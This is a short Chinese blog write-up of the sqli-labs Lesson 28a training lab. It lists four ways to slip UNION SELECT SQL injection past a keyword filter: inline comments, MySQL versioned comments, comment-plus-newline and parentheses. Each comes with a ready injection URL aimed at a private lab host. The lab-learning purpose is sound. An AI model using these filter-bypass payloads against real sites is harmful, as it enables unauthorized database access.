---
title: sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号
date: 2018-10-07 22:36:30
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号

---

## 登录界面

![001](/img/sql/Lesson-28a/001.png)

## 分析

这Lesson-28a比Lesson28还简单,注释了那么多...作者搞返了吧。

![002](/img/sql/Lesson-28a/002.png)

那这里主要分析一下少了这些过滤又有多什么玩法,Lesson-28用过的就不提了,而且这课就不跑SQLMAP了。

1. `/**/`内联注释绕过

   `http://192.168.75.132/sql/Less-28a/?id=1')/**/union/**/select 1,2,3%23`

   ![003](/img/sql/Lesson-28a/003.png)

2. 关键字处用`/!*关键字*/`绕过

   例如： `/*!50000select*/`

   `http://192.168.75.132/sql/Less-28a/?id=2')/*!union*/select 1,2,3%23`

   ![004](/img/sql/Lesson-28a/004.png)

3. 注释加换行符（%23%0A或--%0A）

   `http://192.168.75.132/sql/Less-28a/?id=2') union%23%0Aselect 1,2,3%23`

   ![005](/img/sql/Lesson-28a/005.png)

4.   用括号绕过



   `http://192.168.75.132/sql/Less-28a/?id=-1%27)%20union(select 1,(database()),3)%23`

   ![006](/img/sql/Lesson-28a/006.png)


